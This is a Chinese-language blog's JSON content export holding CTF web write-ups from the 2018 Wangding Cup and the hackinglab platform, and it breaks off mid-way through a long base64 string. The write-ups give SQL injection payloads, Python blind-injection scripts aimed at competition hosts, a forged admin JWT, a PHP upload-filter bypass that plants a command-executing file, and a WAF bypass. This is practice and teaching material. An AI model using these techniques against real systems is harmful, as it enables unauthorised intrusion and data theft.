{"meta":{"title":"Somnus's blog","subtitle":null,"description":null,"author":"Somnus","url":"https://Foxgrin.github.io"},"pages":[{"title":"categories","date":"2018-07-10T08:45:22.000Z","updated":"2018-07-10T09:05:04.058Z","comments":false,"path":"categories/index.html","permalink":"https://Foxgrin.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-07-10T08:40:04.000Z","updated":"2018-07-10T09:04:55.904Z","comments":false,"path":"tags/index.html","permalink":"https://Foxgrin.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2018-07-10T08:49:50.000Z","updated":"2018-07-10T09:05:20.519Z","comments":true,"path":"about/index.html","permalink":"https://Foxgrin.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"网鼎杯第三场Web","slug":"网鼎杯第三场Web","date":"2018-09-04T10:45:00.000Z","updated":"2018-09-04T13:24:41.598Z","comments":true,"path":"/posts/25445/","link":"","permalink":"https://Foxgrin.github.io/posts/25445/","excerpt":"2018年网鼎杯第三场Web题解","text":"2018年网鼎杯第三场Web题解 comein题目：由于运维人员失误，内网认证页面部署至了外网，不过还好，开发加了域名验证。 做的时候服务器已经关闭了，获取源代码本地测试(PS:文件名为index.php，文件放在根目录下，浏览器输入localhost访问) 源代码如下： 12345678910111213141516&lt;?phpini_set(\"display_errors\",0);$uri = $_SERVER['REQUEST_URI'];if(stripos($uri,\".\"))&#123; die(\"Unknow URI.\");&#125;if(!parse_url($uri,PHP_URL_HOST))&#123; $uri = \"http://\".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];&#125;$host = parse_url($uri,PHP_URL_HOST);if($host === \"c7f.zhuque.com\")&#123; setcookie(\"AuthFlag\",\"flag&#123;***&#125;\");&#125;?&gt; 源代码看出，要绕过stripos函数的检测，首先我们要弄清楚全局变量$_SERVER[‘REQUEST_URI’] 12345&lt;?phpecho $_SERVER['REQUEST_URI'];?&gt; 可见返回的是url中/后面的内容 parse_url函数作用是截取url中的指定部分，PHP_URL_HOST是截取url中的主机信息部分 示例： 12345678910111213141516171819202122&lt;?php$url = 'http://username:password@hostname:9090/path?arg=value#anchor';var_dump(parse_url($url, PHP_URL_SCHEME));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_USER));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_PASS));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_HOST));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_PORT));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_PATH));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_QUERY));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_FRAGMENT));echo '&lt;br&gt;';var_dump($_SERVER['REMOTE_ADDR']);?&gt; 执行结果： 可以看出parse_url($url, PHP_URL_HOST)截取的是@后面的hostname 最后要获取flag条件是截取的hostname等于c7f.zhuque.com，所以构造payload:.@c7f.zhuque.com/..// 最前面的.是为了绕过stripos函数，位置为0就不会执行die函数 本地测试代码： 123456789101112131415161718192021&lt;?phpini_set(\"display_errors\",0);$uri = $_SERVER['REQUEST_URI'];echo '$uri = '.$uri.\"&lt;br&gt;\";if(stripos($uri,\".\"))&#123; die(\"Unknow URI.\");&#125;echo 'stripos($uri,\".\") = '.stripos($uri,\".\").\"&lt;br&gt;\";echo \"parse_url($uri,PHP_URL_HOST) = \".parse_url($uri,PHP_URL_HOST).\"&lt;br&gt;\";if(!parse_url($uri,PHP_URL_HOST))&#123; $uri = \"http://\".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];&#125;echo '$uri = '.$uri.\"&lt;br&gt;\";$host = parse_url($uri,PHP_URL_HOST);echo '$host = '.$host.\"&lt;br&gt;\";if($host === \"c7f.zhuque.com\")&#123; setcookie(\"AuthFlag\",\"flag&#123;***&#125;\");&#125;?&gt; 最后加上../是为了回到根目录，再加个/就等于回到localhost/ gold题目：还在上小学的小明同学开发了一款游戏，你能通关吗？ 抓包发现不断POST参数getGod，值从0开始叠加，图片显示收集1000金币就可以通关，就猜测可能POST参数getGod从0到1001就可以得到flag 利用burp的intruder模块发送参数getGod，值从0到1001 发现getGod=1001的响应包中显示了flag PS：这关有防作弊机制，必须单线程的POST参数getGod从0到1001，否则就弹出防作弊的提示框 i_am_admin题目：你能登录进去吗？ 一个登录界面，貌似要以admin身份才能获得flag 给出了提示We have prepare a test account for you to login; Username:Passwd = test:test 以test身份登录 抓取登录数据包，发现登录时在cookie字段设置了auth字段 获得信息： 1Welcome back test user, although i can&apos;t give u flag, but i will give u my SECRET:uy8qz-!kru%*2h7$q&amp;veq=y_r1abu-xd_219y%phex!@4hv62+ 查询得知是JWT，JWT具体介绍参考下面链接 https://blog.csdn.net/qq_40081976/article/details/79046825 到https://jwt.io/解码 登录test身份设置了auth字段，值就是JWT加密后的值，那么我们可以抓包在cookie添加auth字段，值为admin的JWT值，即eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.NYSsNZ1gR8EUYebNTmXPBhdoh-mA5OjHkeWjM4gPxqY 获得flag phone题目：find the flag 有登录和注册的页面，试着注册账号test1,密码123,电话123 返回index.php页面 点击查询得到：有1人和你电话相似哦~ 猜测存在二次注入，根据我们注册用户的电话号码执行sql语句 1select count(*) from table where telephone='123'; 我们再注册账号，密码123，电话123’# 这里电话号码必须是数字，我们可以将字符串转化为十六进制 在本地数据库测试一下 先创建表tel 123456create table tel(username varchar(20),password varchar(20),telphone varchar(100)); 插入数据 12insert into tel values('test1','123','123');insert into tel values('test2','123',\"123#'\"); 那么我们的注入点就在注册POST的phone参数，也就是电话号码 首先爆库，payload:123’ union select database() order by 1 desc# 库名为test 这里末尾加上order by 1 desc是为了将结果倒序 直接在数据库测试简单明了 如果不加order by，那么就只会显示查询的第一行结果1，如果我们将结果倒序处理 那么就显示了我们注入的结果 继续爆表，payload:123’ union select group_concat(table_name) from information_schema.tables where table_schema=database() order by 1 desc# 表名为flag,user 爆flag表下的列名，payload:123’ union select group_concat(column_name) from information_schema.columns where table_name=’flag’ order by 1 desc# 列名为f14g 爆f14g列下数据，payload:123’ union select group_concat(f14g) from flag order by 1 desc# 获得flag","categories":[{"name":"ctf-Web","slug":"ctf-Web","permalink":"https://Foxgrin.github.io/categories/ctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"网鼎杯第二场Web","slug":"网鼎杯第二场Web","date":"2018-08-22T15:02:00.000Z","updated":"2018-09-04T13:24:19.920Z","comments":true,"path":"/posts/47793/","link":"","permalink":"https://Foxgrin.github.io/posts/47793/","excerpt":"2018年网鼎杯第二场Web题解","text":"2018年网鼎杯第二场Web题解 wafUpload源代码 12345678910111213141516171819202122232425262728293031&lt;?php$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);@mkdir($sandbox);@chdir($sandbox);if (!empty($_FILES[&apos;file&apos;])) &#123; #mime check if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) &#123; die(&apos;This type is not allowed!&apos;); &#125; #check filename $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;]; if (!is_array($file)) &#123; $file = explode(&apos;.&apos;, strtolower($file)); &#125; $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) &#123; die(&apos;This file is not allowed!&apos;); &#125; $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) &#123; echo &apos;Success!&apos;; echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename; &#125; else &#123; echo &apos;Failed!&apos;; &#125;&#125;show_source(__file__);?&gt; 一道有过滤的文件上传题，首先过滤的是文件的类型，修改上传类型为[‘image/jpeg’, ‘image/png’, ‘image/gif’]数组中任一一个元素即可，接下来将数组$file的最后一个元素取出判断是否是[‘jpg’, ‘png’, ‘gif’]中的任一元素，如果不是则退出程序，最终上传的文件名为”数组$file的第一个元素.$file[count($file) - 1]”，我们知道如果是一个完整的数组，那么$file[count($file) - 1]一定是数组的最后一个元素，而上面又将最后一个元素规定为jpg或png或gif，而我们的目的是上传一个php文件，那么后缀名一定是要.php，那么我们就可以上传一个不完整的数组，例如 123456789&lt;?php $file = array(); $file[0] = 'demo.php'; $file[10] = 'jpg'; echo $file[count($file) - 1]; //NULL echo '&lt;br&gt;'; $filename = reset($file) . '.' . $file[count($file) - 1]; echo $filename; //demo.php.?&gt; 这样就可以成功上传一个php文件，但是我们最终得到的文件名最后还有一个’.’，所以我们将$file[0]=demo.php/ 这样最终得到demo.php/. burp抓包修改 文件成功上传 访问url/upload/85ed06a27b8eb105c27cbc380822ede8/demo.php/. 抓包POST参数cmd任意执行命令 发现flag 读取 unfinished首先来到的页面时login.php，没有其他提示，扫一下后台，发现register.php， 是一个注册页面，我们试着注册一个用户后登录，这里通过抓包发现注册成功后会返回302状态码重定向到login.php，否则返回200状态码回到register.php 我们可以发现，登录后又重定向到index.php，其中只有显示了用户名 有注册页面，有登录页面，很明显的存在sql查询，那么可以猜测注册页面的sql语句是 1insert into tables values('$email','$username','$password') 如果执行成功，则注册成功，重定向到login.php，然后执行sql语句 1insert into tables values('$email','$username','$password') 有查询结果则登录成功，返回查询结果的用户名信息 那么我们就可以推测这里存在二次注入，我们在register.php中的insert语句注入username，在index.php中显示注入的结果，这就是二次注入 接下来考虑insert注入 直接给出我的payload： 10&apos;+ascii(substr((select database()) from 1 for 1))+&apos;0 这样sql语句就变成了 1insert into tables values('$email','0'+ascii(substr((select database()) from 1 for 1))+'0','$password') 本地数据库测试可行 那么接下来就是写脚本注入了 附上我的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsimport reregister_url = \"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/register.php\"login_url = \"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/login.php\"database = \"\"table_name = \"\"column_name = \"\"flag = \"\"#获取数据库名for i in range(1,10): register_data = &#123; 'email':'test@test'+ str(i), 'username':\"0'+ascii(substr((select database()) from %d for 1))+'0\"%i, 'password':123 &#125; r = requests.post(url=register_url,data=register_data) login_data = &#123; 'email':'test@test'+ str(i), 'password':123 &#125; r = requests.post(url=login_url,data=login_data) match = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r.text) asc = match.group(1) if asc == '0': break database = database + chr(int(asc))print('database:',database)#获取表名'''for i in range(1,20): register_data = &#123; 'email':'test@test'+ str(i), 'username':\"0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0\"%i, 'password':123 &#125; r = requests.post(url=register_url,data=register_data) print(r.text) login_data = &#123; 'email':'test@test'+ str(i), 'password':123 &#125; r = requests.post(url=login_url,data=login_data) r.encoding = r.apparent_encoding print(r.text) match = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r.text) asc = match.group(1) if asc == '0': break table_name = table_name + chr(int(asc))print('table_name:',table_name)'''#获取flagfor i in range(1,100): register_data = &#123; 'email':'test@test'+ str(i) + str(i), 'username':\"0'+ascii(substr((select * from flag) from %d for 1))+'0\"%i, 'password':123 &#125; r = requests.post(url=register_url,data=register_data) login_data = &#123; 'email':'test@test'+ str(i) + str(i), 'password':123 &#125; r = requests.post(url=login_url,data=login_data) match = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r.text) asc = match.group(1) if asc == '0': break flag = flag + chr(int(asc))print('flag:',flag) 这里实际测试获取表名，发现information被过滤了，flag表只能猜测得到 最后执行结果 sqlweb题目首先给出了提示”admin拿不到flag”，题目是一个登陆页面，猜测存在sql注入 首先我们应该是要用admin来登录，先寻找注入点 抓包测试，服务器先检测输入的用户名是否存在，再检查密码是否正确 我们输入uname=admin&amp;passwd=1&amp;submit=login,提示password error 输入uname=admin’#&amp;passwd=1&amp;submit=login,提示password error 说明注入点可能在uname，被单引号包裹，那么我们可以根据提示password error 或者username error进行基于布尔的注入 输入uname=admin’ and 1=1#&amp;passwd=1&amp;submit=login,提示password error 提示waf:/sleep|benchmark|=|like|regexp|and||%|substr|union|\\s+|group|floor|user|extractvalue|UpdateXml|ord|lpad|rpad|left|&gt;|,|ascii/i !!! (trust me,no one can bypass it) 说明此处存在过滤关键字的waf，过滤了空格，用/**/替代，过滤了逗号，过滤了and，用&amp;&amp;替代，还过滤了等号，&gt;，不等号也没办法用，这里可以用in语句来进行布尔注入的判断 过滤了substr,还有mid可以用，过滤了逗号，那么可以用mid( from 1 for 1) 那么我们可以构造payload 1uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/database())/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login 根据返回的username error或者password error判断，如果返回password error，说明判断语句正确，返回username error说明判断语句错误 这里发现响应头部字段存在提示 1hint: &lt;!--create table users ...id username passwd --&gt; 告诉了我们表的结构 猜测flag在passwd，那么我们就注出passwd列下的数据，payload如下 1uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/passwd/**/from/**/users)/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login 但是发现这里还过滤了user，那么就去掉users 1uname=admin&apos;/**/&amp;&amp;/**/mid(passwd/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login 为什么可以这样呢，经过测试发现如果sql语句的前面已经指定了表和用户名，那么passwd直接返回的是该表下用户名对应的密码，如下图所示 接下来就是写个脚本注入了 1234567891011121314151617181920212223import requestsurl = \"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php\"all_string = \"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm\"passwd = \"\"f = 0for i in range(1,100): for j in all_string: data = &#123; 'uname':\"admin'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#\"%(i,j), 'passwd':'1', 'submit':'login' &#125; r = requests.post(url,data=data) if len(r.text) == 75: passwd = passwd + j break elif len(r.text) == 77 and j == 'm': f = 1 break if f == 1: breakprint('passwd:',passwd) 运行结果passwd: admin123 登录admin用户，提示只有wuyanzu用户才能拿到flag 那么我们再爆wuyanzu的密码 1234567891011121314151617181920212223import requestsurl = \"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php\"all_string = \"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm\"passwd = \"\"f = 0for i in range(1,100): for j in all_string: data = &#123; 'uname':\"wuyanzu'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#\"%(i,j), 'passwd':'1', 'submit':'login' &#125; r = requests.post(url,data=data) if len(r.text) == 75: passwd = passwd + j break elif len(r.text) == 77 and j == 'm': f = 1 break if f == 1: breakprint('passwd:',passwd) 执行结果passwd: flag{de822b90-2edf-404c-aaeb-8e797768d9ea} 拿到flag","categories":[{"name":"ctf-Web","slug":"ctf-Web","permalink":"https://Foxgrin.github.io/categories/ctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"hackinglab-Web","slug":"hackinglab-Web","date":"2018-08-20T03:16:00.000Z","updated":"2018-09-04T13:22:50.071Z","comments":true,"path":"/posts/44938/","link":"","permalink":"https://Foxgrin.github.io/posts/44938/","excerpt":"hackinglab平台Web题解","text":"hackinglab平台Web题解 基础关第一题网址：http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php 源代码找到flag 第二题给了密文xrlvf23xfqwsxsqf ，需要我们再加密一次，经过查询这是rot13编码，再加密一次得到keyis23ksdjfkfds 第三题给出了base64加密的密文，需要我们不断解密，写个脚本 123456789101112import base64password = \"Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJe